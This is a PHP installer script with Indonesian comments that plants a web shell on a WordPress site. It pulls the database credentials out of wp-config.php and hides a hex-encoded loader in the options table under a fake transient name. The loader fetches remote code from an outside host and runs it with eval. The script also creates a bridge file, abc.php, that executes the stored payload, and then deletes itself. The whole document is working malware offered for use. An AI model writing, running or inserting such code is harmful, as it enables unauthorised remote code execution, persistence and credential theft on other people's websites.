<?php
// ==========================================
// INSTALLER: RAW HEX LOADER (ANTI BLANK)
// ==========================================
// 1. Mengaktifkan Laporan Error (Supaya kalau gagal ketahuan, bukan blank)
ini_set('display_errors', 1);
error_reporting(E_ALL);

$filename = 'abc.php';
$db_key   = 'transient_sys_pma_check';
$remote   = 'https://stepmomhub.com/77.txt';

// 2. SIAPKAN PAYLOAD
// Kita gunakan logika sederhana: Download -> Eval.
// Tidak ada base64 di sini.
$payload_source = '<?php
// Matikan error di level shell agar tidak mengganggu tampilan
@error_reporting(0); 
$u="' . $remote . '";
$c=curl_init($u);
curl_setopt($c,19913,1); curl_setopt($c,52,1); curl_setopt($c,64,0);
$d=curl_exec($c);
if(!$d) $d=@file_get_contents($u);

if($d){
    // Langsung jalankan kode yang didownload
    eval("?>".$d);
} else {
    echo "<b>ERROR:</b> Gagal mendownload shell dari $u. Cek koneksi server.";
}
?>';

// Ubah ke HEX (Hanya angka dan huruf a-f, sangat bersih)
$payload_hex = bin2hex($payload_source);

// 3. BACA WP-CONFIG
if(!file_exists('wp-config.php')) die("wp-config.php tidak ada.");
$c = file_get_contents('wp-config.php');

function _f($k,$s){if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1];return'';}
$n=_f('DB_NAME',$c); $u=_f('DB_USER',$c); $p=_f('DB_PASSWORD',$c); $h=_f('DB_HOST',$c);
$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m))$x=$m[1];

// 4. INJEKSI DB
if($n){
    $m = new mysqli($h, $u, $p, $n);
    if(!$m->connect_error){
        $m->query("DELETE FROM {$x}options WHERE option_name='$db_key'");
        $m->query("INSERT INTO {$x}options (option_name, option_value, autoload) VALUES ('$db_key', '$payload_hex', 'no')");
        echo "[OK] Payload Hex (Tanpa Base64) tersimpan di Database.<br>";
    } else {
        die("Koneksi DB Gagal: " . $m->connect_error);
    }
}

// 5. BUAT FILE abc.php
// Script ini sangat to-the-point.
// Baca Hex -> Convert jadi String -> Eval.
// Saya tambahkan error checking agar jika blank, dia akan teriak errornya apa.

$bridge_code = <<<'PHP'
<?php
// AKTIFKAN DEBUGGING (Agar tidak blank putih jika error)
ini_set('display_errors', 1); 
error_reporting(E_ALL);

$c = file_get_contents('wp-config.php');
function _k($k,$s){if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1];return'';}
$n=_k('DB_NAME',$c); $u=_k('DB_USER',$c); $p=_k('DB_PASSWORD',$c); $h=_k('DB_HOST',$c);
$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m))$x=$m[1];

if($n){
    $m = new mysqli($h, $u, $p, $n);
    if($m->connect_error){
        die("DB Connection Failed: " . $m->connect_error);
    }
    
    $q=$m->query("SELECT option_value FROM {$x}options WHERE option_name='transient_sys_pma_check' LIMIT 1");
    if($q && $r=$q->fetch_assoc()){
        
        // 1. Decode Hex menjadi PHP Code Asli
        // Tidak ada Base64. Ini murni konversi bilangan.
        $code = hex2bin($r['option_value']);
        
        if(!$code){
            die("Error: Gagal mendekode Hex dari database.");
        }

        // 2. Eksekusi
        // Kita gunakan eval() karena ini satu-satunya cara menjalankan kode dari variabel
        // tanpa membuat file fisik dan tanpa base64 stream.
        try {
            eval('?>' . $code);
        } catch (ParseError $e) {
            echo "Parse Error: " . $e->getMessage();
        } catch (Throwable $e) {
            echo "Error: " . $e->getMessage();
        }
    } else {
        echo "Payload tidak ditemukan di Database.";
    }
}
?>
PHP;

if(file_put_contents($filename, $bridge_code)){
    echo "[OK] <b>$filename</b> berhasil dibuat.<br>";
    echo "Fitur: <b>Debug Mode On</b> (Anti Blank Screen).<br>";
    echo "Metode: <b>Hex -> Eval</b> (Tanpa Base64).<br>";
    echo "<br>Silakan akses: <b><a href='$filename'>$filename</a></b>";
}

unlink(__FILE__);
?>
